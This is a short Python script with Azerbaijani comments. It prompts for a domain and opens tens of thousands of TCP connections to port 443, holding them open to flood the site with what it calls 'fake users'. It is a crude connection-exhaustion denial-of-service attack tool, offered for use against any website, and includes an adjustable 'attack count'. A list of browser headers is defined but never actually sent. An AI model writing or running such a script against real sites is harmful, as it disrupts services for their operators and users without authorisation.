import socket
import sys
attackList = []
HTTPHeaders = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/41.0 Firefox/42.0", # asagida alternativler movcuddur ( 7-ci setir)
    "Accept-language: *" # asagida alternativler movcuddur ( 11-ci setir) 
    ############## User-agent ucun:
    # Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
    # Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0
    # Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41
    ############# Accept-language ucun: 
    # fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
    # de
    # de-CH
    # en-US,en;q=0.5
]
hostName = input("domain daxil edin ( www.example.com): ")
attackCount = 69719 # buradan hucum sayini artirin.
print("{} saytina {} eded fake user gonderilir.".format(hostName, attackCount))
for i in range(1,attackCount+1):
    d = list(str(i))
    if((d[-1]=="1" or d[-1]=="2" or d[-1]=="5" or d[-1]=="6" or d[-1]=="7" or d[-1]=="8") or (d[-1]=="0" and (d[-2]=="2" or d[-2]=="4" or d[-2]=="5" or d[-2]=="6" or d[-2]=="7" or d[-2]=="8" or d[-2]=="9" or(d[-2]=="0" and d[-3]=="0")))): j = "ci"
    else: j = "cu"
    try:
        print("{}-{} user gonderildi".format(i,j))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((hostName, 443))
    except socket.error:
        if i> 1:
            print("{} user yeterlidir :)".format(i))
            break
        break
    attackList.append(s)
if i==1:
    print("Xeta bas verdi. Internet baglantinizi yoxlayin")
else:
    print("{} saytina ugurla {} eded fake user gonderildi.".format(hostName, i))
